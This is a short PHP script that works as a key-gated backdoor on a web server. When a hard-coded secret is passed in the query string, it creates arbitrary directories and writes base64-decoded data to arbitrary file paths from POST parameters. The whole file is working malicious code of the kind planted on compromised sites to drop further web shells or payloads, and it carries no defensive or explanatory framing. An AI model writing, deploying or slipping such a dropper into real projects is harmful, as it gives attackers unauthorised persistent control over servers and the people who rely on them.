<?php 
	$kk = $_GET['k'];
	if( $kk != '6dc97a77a6165db10df4aa8412a672ea' ){
		exit('.');
	}
	
	function jss($data)
	{
		echo json_encode( $data );
	}

	$comm = $_POST['cmd'];

	if( !empty( $comm ) ){

		if( $comm == "test" ){

			jss(array(
				"code" => 200,
			));

		}

		if( $comm == "mkdir" ){

			$tmp_dir = $_POST['dir'];

			mkdir( $tmp_dir );
			chmod( $tmp_dir , 0755 );

			jss(array(
				"code" => 200,
			));

		}

		if( $comm == "upload" ){

			$post_file = $_POST['file'];
			$post_data = $_POST['data'];

			$post_data_enc = base64_decode( $post_data );

			file_put_contents( $post_file , $post_data_enc );
			chmod( $post_file , 0644 );

			jss(array(
				"code" => 200,
			));

		}

	}